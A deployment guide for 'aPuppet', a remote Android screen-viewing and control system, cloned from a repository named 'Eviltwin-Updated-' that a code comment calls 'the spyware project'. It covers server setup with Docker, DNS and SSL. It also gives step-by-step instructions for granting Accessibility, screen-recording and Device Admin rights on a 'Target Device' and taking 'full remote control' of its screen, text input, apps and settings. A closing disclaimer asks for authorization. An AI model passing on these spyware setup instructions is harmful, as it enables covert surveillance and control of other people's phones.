# aPuppet Server - Complete Deployment Guide

## Overview

**aPuppet** is a powerful WebRTC-based remote Android control system that allows real-time:
- Screen sharing and viewing
- Remote gesture control (tap, swipe, navigation)
- Session-based access with authentication
- Cross-platform web interface

## System Architecture

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Android App   │◄──►│   aPuppet Server │◄──►│   Web Admin     │
│  (Target Device)│    │ (Control Center) │    │ (Your Browser)  │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                              │
                       ┌──────┴──────┐
                       │   Services  │
                       │ • Janus     │
                       │ • Nginx     │
                       │ • WebRTC    │
                       └─────────────┘
```

## Quick Start (Windows with Docker)

### Prerequisites
- **Docker Desktop** - Download from [docker.com](https://docker.com)
- **Git** - Download from [git-scm.com](https://git-scm.com)
- **Windows 10/11** with WSL2 enabled

### 1. Download & Setup

```bash
# Clone the spyware project
git clone https://github.com/Shantelwayne/Eviltwin-Updated-.git
cd Eviltwin-Updated-/apuppet-server

# Configure the server
notepad config.yaml
```

**Edit config.yaml:**
```yaml
---
hostname: "localhost"           # For local testing
email: "admin@localhost.com"    # Admin email
```

### 2. Start Docker Desktop
- Open Docker Desktop application
- Wait for it to fully start (green light in system tray)
- Ensure Docker is running: `docker --version`

### 3. Launch aPuppet Server

```bash
# Start all services in background
docker-compose up -d

# Check service status
docker-compose ps

# View logs
docker-compose logs -f
```

### 4. Access Control Panel

Open your browser and go to:
- **Web Admin**: http://localhost/web-admin/
- **Janus API**: http://localhost:8088
- **Test Server**: http://localhost:8080

## Production Deployment (Linux Server)

### System Requirements

**Minimum Specs:**
- 1 CPU core
- 2GB RAM  
- 5GB storage
- Ubuntu 20.04+ LTS

**Recommended:**
- 2+ CPU cores
- 4GB+ RAM
- 20GB+ SSD storage
- Dedicated server/VPS

### Step-by-Step Linux Deployment

#### 1. Server Preparation
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y git curl docker.io docker-compose

# Enable Docker
sudo systemctl enable docker
sudo systemctl start docker
sudo usermod -aG docker $USER
```

#### 2. Domain Setup
```bash
# Point your domain to server IP
# DNS A Record: apuppet.yourdomain.com → YOUR_SERVER_IP
```

#### 3. Deploy aPuppet
```bash
# Clone project
git clone https://github.com/Shantelwayne/Eviltwin-Updated-.git
cd Eviltwin-Updated-/apuppet-server

# Configure domain
nano config.yaml
```

**Production config.yaml:**
```yaml
---
hostname: "apuppet.yourdomain.com"
email: "admin@yourdomain.com"
```

#### 4. Install & Start
```bash
# Make installer executable
chmod +x install.sh

# Run installation (requires sudo)
sudo ./install.sh
```

#### 5. SSL Certificate (Automatic)
The installer automatically configures SSL via LetsEncrypt:
- Port 80 → Redirects to HTTPS
- Port 443 → SSL-enabled access
- Auto-renewal configured

## Service Configuration

### Port Mappings
| Service | Internal | External | Purpose |
|---------|----------|----------|---------|
| Nginx | 80, 443 | 80, 443 | Web server & SSL |
| Janus | 8088 | 8088 | WebRTC API |
| WebSocket | 8989 | 8989 | Real-time comm |
| RTP Ports | 10000-10500 | 10000-10500/udp | Media streaming |
| Test Server | 8080 | 8080 | Development only |

### Service Management
```bash
# Start services
docker-compose up -d

# Stop services
docker-compose down

# Restart specific service
docker-compose restart nginx

# View logs
docker-compose logs janus
docker-compose logs nginx

# Check status
docker-compose ps
```

## Android Client Setup

### 1. Install aPuppet App
- **Google Play**: Search "aPuppet" or use your custom APK
- **Direct APK**: Use the Android app from `/android-app/` directory

### 2. Configure Connection
1. Open aPuppet app
2. Enter server URL: `https://apuppet.yourdomain.com`
3. Generate session ID or use provided one
4. Set password for session

### 3. Grant Permissions
**Required permissions:**
- **Accessibility Service** - For gesture simulation
- **Screen Recording** - For screen sharing
- **Device Admin** - For advanced control

**Setup steps:**
1. Settings → Accessibility → aPuppet → Enable
2. Settings → Apps → aPuppet → Permissions → Allow all
3. Settings → Security → Device Administrators → Enable aPuppet

## Usage Instructions

### Starting a Remote Session

#### On Target Device (Android):
1. Open aPuppet app
2. Enter session ID (e.g., "session123")
3. Set password (e.g., "pass456")  
4. Tap "Connect"
5. Grant screen recording permission when prompted
6. Device is now ready for remote control

#### On Control Device (Your Computer):
1. Open browser: `https://apuppet.yourdomain.com/web-admin/`
2. Enter same session ID: "session123"
3. Enter password: "pass456"
4. Click "Connect"
5. **You now have full remote control!**

### Remote Control Features

**Available Controls:**
- ✅ **Live screen viewing** - Real-time screen streaming
- ✅ **Touch/Tap control** - Click anywhere to tap
- ✅ **Swipe gestures** - Click and drag to swipe
- ✅ **Navigation buttons** - Back, Home, Recent apps
- ✅ **Text input** - Type on target device
- ✅ **App launching** - Start any application
- ✅ **Settings access** - Modify device settings

## Troubleshooting

### Common Issues

#### 1. Docker Not Starting
```bash
# Check Docker status
systemctl status docker

# Restart Docker
sudo systemctl restart docker

# Check for conflicts
sudo netstat -tlnp | grep :80
```

#### 2. SSL Certificate Issues
```bash
# Check certificate status
sudo certbot certificates

# Renew certificates
sudo certbot renew

# Test renewal
sudo certbot renew --dry-run
```

#### 3. WebRTC Connection Problems
```bash
# Check Janus logs
docker-compose logs janus

# Verify ports are open
sudo ufw status
sudo ufw allow 8088
sudo ufw allow 8989
sudo ufw allow 10000:10500/udp
```

#### 4. Android App Won't Connect
- Verify server URL is accessible from Android device
- Check if using HTTPS (required for production)
- Ensure session ID and password match exactly
- Verify all permissions are granted on Android device

### Log Locations
```bash
# Service logs
docker-compose logs

# Individual service logs
docker-compose logs nginx
docker-compose logs janus

# System logs
sudo journalctl -u docker
```

## Security Considerations

### Production Security
- **Always use HTTPS** in production
- **Change default passwords** immediately  
- **Restrict access** via firewall/VPN
- **Monitor sessions** for unauthorized access
- **Regular updates** of Docker images

### Network Security
```bash
# Configure firewall
sudo ufw enable
sudo ufw allow ssh
sudo ufw allow 80
sudo ufw allow 443
sudo ufw allow 8088
sudo ufw allow 8989
sudo ufw allow 10000:10500/udp
```

### Session Security
- Use **strong session passwords**
- **Limit session duration**
- **Monitor active sessions**
- **Log all remote actions**

## Advanced Configuration

### Custom Janus Config
Edit `janus-config/janus.jcfg` for advanced WebRTC settings:
- ICE server configuration
- STUN/TURN servers
- Media codec preferences
- Bandwidth limitations

### Nginx Customization  
Edit `nginx-config/nginx.conf` for:
- Custom SSL settings
- Rate limiting
- Access controls
- Reverse proxy configuration

### Scaling for Multiple Users
```yaml
# docker-compose.yml modifications for high load
services:
  janus:
    deploy:
      replicas: 3
    ports:
      - "8088-8090:8088"  # Multiple Janus instances
```

## Monitoring & Maintenance

### Health Checks
```bash
# Check all services
docker-compose ps

# Test connectivity
curl -k https://apuppet.yourdomain.com/web-admin/

# Monitor resources
docker stats
```

### Backup Strategy
```bash
# Backup configuration
tar -czf apuppet-backup.tar.gz \
  config.yaml \
  janus-config/ \
  nginx-config/ \
  web-admin/

# Automated backup script
echo "0 2 * * * cd /path/to/apuppet && tar -czf /backups/apuppet-\$(date +\%Y\%m\%d).tar.gz config.yaml janus-config/ nginx-config/" | crontab -
```

### Updates
```bash
# Update Docker images
docker-compose pull

# Restart with new images
docker-compose down && docker-compose up -d

# Update project code
git pull origin master
```

## Support & Documentation

### Additional Resources
- **Official Docs**: https://apuppet.org
- **Janus Documentation**: https://janus.conf.meetecho.com/docs/
- **WebRTC Guides**: https://webrtc.org/getting-started/

### Getting Help
- Check logs first: `docker-compose logs`
- Verify configuration matches this guide
- Test with different Android devices
- Check network connectivity and firewall rules

---

**⚠️ Legal Notice**: This software is for authorized device management only. Ensure you have explicit permission before deploying on any Android device. Unauthorized use may be illegal in your jurisdiction.

**🚀 Pro Tip**: Start with local testing (`localhost`) before deploying to production servers. This helps identify configuration issues early.